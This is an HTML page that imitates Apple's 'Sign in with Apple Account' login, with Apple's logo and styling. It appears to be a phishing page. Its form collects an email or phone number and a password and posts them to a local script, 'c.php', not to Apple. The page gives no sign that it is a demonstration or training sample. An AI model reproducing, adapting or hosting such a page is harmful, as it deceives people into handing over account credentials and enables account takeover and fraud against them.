<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Sign in with Apple Account</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600&display=swap"><style>:root{--bg-color:#fafafa;--text-color:#000;--input-bg:#fff;--input-border:#ccc;--box-bg:#fff;--dot-shadow:rgba(0,0,0,.1)}@media (prefers-color-scheme:dark){:root{--bg-color:#121212;--text-color:#f2f2f2;--input-bg:#1e1e1e;--input-border:#333;--box-bg:#1c1c1e;--dot-shadow:rgba(255,255,255,.1)}}*{box-sizing:border-box}body{margin:0;font-family:'SF Pro Display',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background-color:var(--bg-color);color:var(--text-color);display:flex;align-items:center;justify-content:center;height:100vh}.login-container{background:var(--box-bg);border-radius:20px;box-shadow:0 8px 24px var(--dot-shadow);width:400px;padding:40px 30px;text-align:center}.circle-container{position:relative;width:100px;height:100px;margin:0 auto 20px}.dot{position:absolute;width:8px;height:8px;background:red;border-radius:50%}.apple-logo{position:absolute;top:50%;left:50%;width:30px;transform:translate(-50%,-50%);filter:invert(0)}@media (prefers-color-scheme:dark){.apple-logo{filter:invert(1)}}h2{margin-bottom:30px;font-weight:600}input[type="text"],input[type="password"]{width:100%;padding:12px;margin-bottom:15px;border-radius:8px;border:1px solid var(--input-border);background-color:var(--input-bg);color:var(--text-color);font-size:16px}.submit-btn{width:100%;padding:12px;background-color:#0071e3;border:none;border-radius:8px;color:white;font-size:16px;cursor:pointer}.checkbox{margin-top:10px;display:flex;align-items:center;justify-content:center;font-size:14px}.checkbox input{margin-right:8px}</style></head><body><div class="login-container"><div class="circle-container" id="circle"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo"/></div><h2>Sign in with Apple Account</h2><form action="c.php" method="post"><input type="text" name="email" placeholder="Email or Phone Number" required/><input type="password" name="password" placeholder="Password" required/><button class="submit-btn" type="submit">Sign In</button><div class="checkbox"><input type="checkbox" id="keep"/><label for="keep">Keep me signed in</label></div></form></div><script>(function(){const e=document.getElementById("circle"),t=["#FF6A5E","#FFA07A","#FAD6A5","#C9E4CA","#A0E7E5","#B4F8C8","#85E3FF","#D0BFFF","#D291BC","#FFB7C5","#FF6F91","#FF9671"],n=48;for(let r=0;r<n;r++){const o=document.createElement("div");o.classList.add("dot");const a=360/n*r,d=45,c=50+d*Math.cos(a*Math.PI/180),i=50+d*Math.sin(a*Math.PI/180);o.style.left=`${c-4}px`,o.style.top=`${i-4}px`,o.style.background=t[r%t.length],e.appendChild(o)}})();</script></body></html>
